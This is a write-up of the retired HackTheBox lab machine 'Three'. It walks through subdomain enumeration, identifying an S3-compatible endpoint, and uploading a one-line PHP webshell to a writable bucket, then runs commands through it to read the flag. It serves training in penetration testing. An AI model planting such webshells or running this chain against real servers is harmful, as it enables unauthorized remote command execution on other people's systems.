# HackTheBox — Three Write-up

| | |
|---|---|
| **Platform** | HackTheBox (Starting Point) |
| **Machine** | Three |
| **OS** | Linux |
| **Domain** | `thetoppers.htb` |
| **Focus** | VHost enumeration, S3 bucket fingerprinting, writable bucket → PHP webshell RCE |

> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP where shown.

---

## 1. Reconnaissance

Map the host so the name-based site resolves:

```bash
sudo subl /etc/hosts        # add: <target-ip>  thetoppers.htb
```

> Editing `/etc/hosts` lets you resolve a hostname to an IP locally, so name-based virtual hosts (and the site's own links) load correctly.

---

## 2. Virtual Host Enumeration

Fuzz for virtual hosts. `gobuster vhost` is used for subdomains (whereas `gobuster dir` is for directories). On newer Gobuster versions you must add `--append-domain` or it errors out:

```bash
gobuster vhost -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain
```

```
s3.thetoppers.htb
```

Add the discovered subdomain to `/etc/hosts` as well:

```
<target-ip>  thetoppers.htb s3.thetoppers.htb
```

(`ffuf` would work equally well for this step.)

---

## 3. Fingerprinting the S3 Subdomain

Look for files on the subdomain, then identify the technology:

```bash
gobuster dir -u http://s3.thetoppers.htb/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt

nikto -host http://s3.thetoppers.htb
```

The scan reveals the subdomain is an **Amazon S3 / S3-compatible** endpoint (a local S3 service such as LocalStack). That means an AWS CLI can talk to it directly.

---

## 4. Accessing the Bucket

Configure the AWS CLI — since this is a local/mock S3, any dummy values are accepted:

```bash
aws configure
# AWS Access Key ID:     test
# AWS Secret Access Key: test
# region / output:       (anything)
```

List the bucket via the custom endpoint:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The objects in this bucket are the very files served by `http://thetoppers.htb` — the website is hosted out of the bucket. Crucially, the bucket is **writable**, so anything uploaded becomes web-accessible on the main site.

---

## 5. Webshell Upload → RCE

Create a minimal PHP command webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload it into the bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

Because the bucket backs the website, the shell is now reachable on the main domain. Execute commands through the `cmd` parameter:

```bash
# list the parent directory
http://thetoppers.htb/shell.php?cmd=ls+../

# read the flag
http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
```

The flag is returned in the response.

